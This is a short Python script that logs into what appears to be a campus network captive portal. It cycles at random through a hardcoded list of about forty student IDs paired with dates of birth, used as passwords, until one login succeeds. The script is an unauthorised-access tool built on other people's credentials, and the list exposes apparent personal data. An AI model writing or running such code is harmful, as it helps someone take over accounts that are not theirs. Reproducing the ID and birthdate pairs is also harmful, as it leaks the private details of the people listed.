import requests

def login(username,password):
    r = requests.get('http://msfconnect.com/')
    magic = r.url.split('?')[1];
    r = requests.post('http://msfconnect.com/',{'username':username,'password':password,'magic':magic , '4Tredir':'http://msfconnect.com/'})
    if 'keepalive' in r.url :
        print(username)
        return r.url
    else :
        return -1


arr = ['B170224CE:30-10-1999','B170229EC:04-03-1999','B170230ME:19-08-1998','B170233CH:21-06-1999','B170236CS:24-10-1998','B170243CH:16-04-1999','B170245EC:19-03-1998','B170246ME:14-10-1999','B170247CE:29-04-1998','B170248EE:24-06-1999','B170249EC:24-06-1999','B170251AR:28-01-1998','B170255CE:13-06-1999','B170256AR:02-02-1999','B170257CH:09-04-1998','B170264CE:25-03-1999','B170265ME:26-08-1999','B170267EC:01-04-1999','B170270ME:04-03-1998','B170271CE:09-08-1999','B170274EE:17-11-1999','B170275AR:03-06-1998','B170276CH:10-07-1999','B170278EP:06-12-1997','B170280EC:10-10-1998','B170353EC:15-03-1999','B170354EE:01-05-1998','B170361EC:28-08-1999','B170362CH:31-01-1999','B170363CE:05-01-1999','B170367EE:23-12-1997','B170371CS:06-12-1999','B170378ME:11-03-1999','B170379EE:07-04-1998','B170387EE:26-12-1999','B170390CS:02-08-1998','B170392EE:26-09-1999','B170394BT:11-06-1998','B170398EE:28-08-1999','B170403ME:29-07-1998']

import random
t = -1
while t==-1:
	s = random.randint(0,len(arr))
	usern = arr[s].split(':')[0]
	pwd = arr[s].split(':')[1]
	try:
		t = login(usern,pwd)
	except:
		continue
print(t)

